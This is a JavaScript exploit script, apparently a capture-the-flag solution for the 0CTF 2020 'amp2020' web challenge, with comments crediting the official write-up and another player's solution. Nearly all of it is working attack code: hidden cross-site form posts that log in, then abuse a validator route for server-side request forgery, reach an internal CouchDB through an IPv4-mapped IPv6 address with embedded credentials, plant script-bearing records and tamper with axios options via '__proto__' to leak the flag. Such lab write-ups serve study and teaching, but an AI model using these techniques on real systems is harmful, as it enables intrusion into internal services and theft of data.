// this writeup was done after the ctf ended, I'm combining elements from
// - official writeup: https://github.com/zsxsoft/my-ctf-challenges/tree/master/0ctf2020/amp2020
// - wbowling's solution https://gist.github.com/wbowling/f829196dc9845953762d22bebf80a6ae

const username = 'rpjim';
const password = 'rpjim';
const dbname = 'a863d4f864bc6b09836d9b340b47419b7';

const sleep = d => new Promise(r => setTimeout(r, d));

// there are two approaches to sending the post requset
// 1. send it as x-url-formencoded via fetch and send the body after serializing the JSON object
//      ex. type='url'&input[url]='google.com'&input[timeout]=3000
// 2. use forms and post it to an iframe. instead of directly sending the body, send a form with child elements and target it at the iframe
//    NOTE: This is what I chose to do in this exploit

function createPostForm(url){
    let form = document.createElement('form');
    form.method = 'POST';
    form.action = url;
    form.target = 'iframe';
    document.body.appendChild(form);
    return form;
}

function createInput(name, value){
    let input = document.createElement('input');
    input.name = name;
    input.value = value;
    return input;
}

async function doExploit(){

    //const baseUrl = 'http://192.168.99.100:33000';
    const baseUrl = 'http://127.0.0.1:3000';

    let iframe = document.createElement('iframe');
    iframe.name = 'iframe';
    document.body.appendChild(iframe);

    // login to set up cookies
    let form = createPostForm(baseUrl + '/users/login');
    form.appendChild(createInput('username', username));
    form.appendChild(createInput('password', password));
    form.submit();
    await sleep(100);

    // for all database interactions, need to use validator route as stated in official writeup
    // this is because chrome itself has no support for embeded credentials in subresource requests
    // a transparent proxy would be an idea to bypass this but because the domain is local (127.0.0.1) and not public, it is difficult
    // also, the ssrf bypass is to convert ipv4 to ipv6: [::ffff:ac1e:103]:5984

    // create a and z entries in database which will contain script element to throw error with flag in it
    // this is done by passing in an object to axios instead of just a URL
    form = createPostForm(baseUrl + '/validator');
    form.appendChild(createInput('type', 'url'));
    form.appendChild(createInput('input[url]', 'http://' + dbname + ':' + password + '@[::ffff:ac1e:103]:5984/' + dbname + '/a'));
    form.appendChild(createInput('input[method]', 'PUT'));
    form.appendChild(createInput('input[headers][Content-Type]', 'application/json'));
    form.appendChild(createInput('input[data]', '{"placeholder": "<script></script><meta \'"}'));
    form.submit();
    await sleep(100);

    form = createPostForm(baseUrl + '/validator');
    form.appendChild(createInput('type', 'url'));
    form.appendChild(createInput('input[url]', 'http://' + dbname + ':' + password + '@[::ffff:ac1e:103]:5984/' + dbname + '/z'));
    form.appendChild(createInput('input[method]', 'PUT'));
    form.appendChild(createInput('input[headers][Content-Type]', 'application/json'));
    form.appendChild(createInput('input[data]', '{"placeholder": ">"}'));
    form.submit();
    await sleep(100);

    // at this point setup is complete, all that is left is to redirect the dom itself to the validator route with
    form = document.createElement('form');
    form.action = baseUrl + '/validator';
    form.method = 'POST';
    document.body.appendChild(form);

    form.appendChild(createInput('type', 'url'));
    form.appendChild(createInput('input[url]', 'http://' + dbname + ':' + password + '@[::ffff:ac1e:103]:5984/' + dbname + '/_find'));
    form.appendChild(createInput('input[method]', 'POST'));
    form.appendChild(createInput('input[headers][Content-Type]', 'application/json'));
    form.appendChild(createInput('input[data]', '{"selector": {}}'));
    form.appendChild(createInput('input[responseType]', 'text'));
    // this is to disable axios automatically making the response into an object which makes the output [object Object]
    // with a form, we can only pass in strings so we set transformReponse.__proto__=""
    // NOTE: I'm not 100% sure why this works and wbowling's solution has a different method to fail JSON encoding, maybe try that later?
    form.appendChild(createInput('input[transformResponse][__proto__]', ''));

    form.submit();

}

document.addEventListener('DOMContentLoaded', function() {
    doExploit();
});
